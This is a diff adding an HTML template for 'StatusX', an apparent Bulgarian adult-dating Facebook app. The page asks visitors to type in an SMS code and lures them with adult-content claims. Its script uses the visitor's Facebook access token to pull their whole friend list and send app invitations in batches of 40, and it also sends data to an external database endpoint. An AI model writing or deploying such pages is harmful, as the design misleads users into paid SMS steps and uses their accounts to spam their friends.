@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>(:title:)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="(:descr:)">
+<meta name="author" content="Rudi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="(:title:)">
+<link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.1/css/bootstrap-combined.min.css" rel="stylesheet">
+<style type="text/css">
+body, td, th, div, span { font-size: 11px; font-family: 'lucida grande', tahoma, verdana, arial, sans-serif; }
+ 
+.row-fluid.show-grid .span3 { padding-bottom: 5px; }
+.notlogged {display:none}
+</style>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+<script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.2.1/js/bootstrap.min.js"></script>
+ 
+<meta prefix="fb: http://ogp.me/ns/fb#" property="fb:app_id" content="(:appid:)" />
+<meta prefix="fb: http://ogp.me/ns/fb#" property="fb:admins" content="572383379" />
+
+</head>
+<body style="overflow:hidden">
+
+
+
+<div class="navbar navbar-inverse navbar-fixed-top">
+      <div class="navbar-inner">
+    
+           
+          <a class="brand" href="./index.html">StatusX</a>
+          <div class="nav-collapse collapse">
+            <ul class="nav">
+              <li class="active">
+                <a href="./index.html">Home</a>
+              </li>
+              
+            </ul>
+          </div>
+        </div>
+    
+    </div>
+<div   style="padding-top:45px;">
+<div class="row-fluid">
+  <div class="span12">   
+    <div class="row-fluid">
+      <div class="span3" style="text-align:center;"> <img src="https://arpecop.net/luck/images/flirtbot.png">
+   
+      
+      <div><strong>StatusX е сайт за запознаване на нови хора за авантюри чрез уеб камери, телефони, срещи и запознанства.</strong></div>
+      <button    class="btn btn-large btn-danger span12">Вход</button>
+      <div class="additional notlogged">
+      additional
+      
+      </div>
+      <div class="logged"  style="padding-left:4px;">
+        <ul class="nav nav-tabs nav-stacked notlogged">
+              <li><a href="search.html" target="_top">Търсене</a></li>
+              <li><a href="messages.html">Съобщения</a></li>
+            </ul>
+      
+      </div>
+      </div>
+      <div class="span9">   
+         <div class="row-fluid show-grid">
+         
+        
+            <div  class="span3" >
+          <h3>Съдържанието е достъпно само за пълнолетни който искат авантюри веднага.</h3>
+          
+         
+            </div>
+                 <div  class="span3" >
+                  
+            Получената парола от телефона препишете във формата
+                 </div>
+            <div  class="span6" >
+ 
+            <div class="input-append">
+           
+  <input class="span2" id="smscode" type="text" placeholder="СМС КОД">
+  <button class="btn" type="button">Изпрати Потвърждение</button>
+</div>
+               
+         
+          
+ </div>
+         </div>
+      
+        <div class="row-fluid show-grid"> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/001.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/002.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/003.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/004.jpg"></div>
+          <div class="row-fluid show-grid"> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/005.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/006.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/002-bg.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/008.jpg"></div> </div>
+          <div class="row-fluid show-grid"> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/009.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/001-bg.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/011.jpg"></div> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/012.jpg"></div> </div>
+          <div class="row-fluid show-grid"> <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/013.jpg"></div> 
+          
+           <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/014.jpg"></div> 
+            <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/015.jpg"></div> 
+             <div class="span3"><img class="img-rounded"  src="http://arpecop.net/static/statusx/images/003-bg.jpg"></div> 
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Docs nav
+    ================================================== --> 
+  
+</div>
+<div id="fb-root"></div>
+<script>
+ var task = {test:"mest"}
+ $.ajax({
+                    type: "PUT",
+                    url: "//arpecop.net/db/dating/test",
+                    contentType: "application/json",
+                    data: JSON.stringify(task),
+                    success: function () {
+                     
+                    }
+                 });
+
+(function($){
+  $.fn.shuffle = function() {
+    return this.each(function(){
+      var items = $(this).children();
+      return (items.length) 
+        ? $(this).html($.shuffle(items)) 
+        : this;
+    });
+  }
+   
+  $.shuffle = function(arr) {
+    for(
+      var j, x, i = arr.length; i; 
+      j = parseInt(Math.random() * i), 
+      x = arr[--i], arr[i] = arr[j], arr[j] = x
+    );
+    return arr;
+  } 
+})(jQuery);
+Array.prototype.chunk = function(chunkSize) {
+    var array=this;
+    return [].concat.apply([],
+        array.map(function(elem,i) {
+            return i%chunkSize ? [] : [array.slice(i,i+chunkSize)];
+        })
+    );
+}
+
+function send_requests() { 
+        FB.ui({method: 'apprequests',
+          message: 'Фриртче във Фейсбук',
+          to:$.gvar.invites[$.gvar.next_chunk_invites]
+        }, function (response) {
+       if(response) {
+ 		  var current_percentage_step = $.gvar.next_chunk_invites + 1;
+          var total_steps =  $.gvar.invites.length;
+        $.gvar.next_chunk_invites++;
+         var test = Math.round(100 * current_percentage_step  / total_steps);
+         
+        // $('.progress .bar').css('width',test+'%');
+          
+         if (total_steps >= $.gvar.next_chunk_invites) {
+           window.top.location = "(:host:)/"+$.gvar.uid+"-logged.html";
+         
+         }  else {
+          send_requests($.gvar.next_chunk_invites);
+         }
+			
+       } else {
+ 
+         window.top.location = "(:host:)/"+$.gvar.uid+"-logged.html";
+         
+       }
+    }); 
+};
+
+
+//friends_location
+
+
+
+
+	$.gvar = {};
+$.gvar.next_chunk_invites = 0;
+   
+ 
+	
+	function logged() {
+			var fb_invites = [];
+		$.getJSON('https://graph.facebook.com/'+$.gvar.fb_uid+'/friends?fields=hometown,location,name&access_token='+$.gvar.fb_accessToken+'&callback=?', function(data) {
+			////console.log(data);
+			$.each(data.data, function(index, value) {
+		 
+ 			fb_invites[index] = value.id;
+		});
+
+		
+ 
+ 
+			var chunksize = 40;
+			var invites = fb_invites.chunk(chunksize);
+	 var arr_invetes2 = [];
+$.each(invites, function(index, value) { 
+   arr_invetes2[index] = value.join(',');
+});
+ $.gvar.invites = arr_invetes2;
+ 
+ });
+	}
+	
+
+	
+	
+	
+  
+	
+	
+
+    window.fbAsyncInit = function() {
+        FB.init({
+            appId      : '142587889152183', // App ID
+            channelUrl : '//www.secretzone.bg/channel.html', // Channel File
+            status     : true, // check login status
+            cookie     : true, // enable cookies to allow the server to access the session
+            xfbml      : true  // parse XFBML
+        });
+  FB.Canvas.setAutoGrow();
+  
+ 
+  
+
+        FB.getLoginStatus(function(response) {
+            if (response.status === 'connected') {
+  
+                                         $.gvar.fb_uid = response.authResponse.userID;
+                                         $.gvar.fb_accessToken = response.authResponse.accessToken;
+                                logged();
+            
+            } else if (response.status === 'not_authorized') {
+ 
+            } else {
+                // the user isn't logged in to Facebook.
+            }
+        });
+    };
+
+    // Load the SDK Asynchronously
+    (function(d){
+        var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
+        if (d.getElementById(id)) {return;}
+        js = d.createElement('script'); js.id = id; js.async = true;
+        js.src = "//connect.facebook.net/bg_BG/all.js";
+        ref.parentNode.insertBefore(js, ref);
+    }(document));
+</script>
+
+
+
+<!-- Button to trigger modal -->
+
+ 
+<!-- Modal -->
+<div id="myModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-header">
+    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+    <h3 id="myModalLabel">Modal header</h3>
+  </div>
+  <div class="modal-body">
+    <p>Съдържанието е достъпно само за пълнолетни който искат авантури веднага.</p>
+  </div>
+  <div class="modal-footer">
+    <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
+    <button class="btn btn-primary" id="pay">Save changes</button>
+  </div>
+</div>
+</body>
+</html>
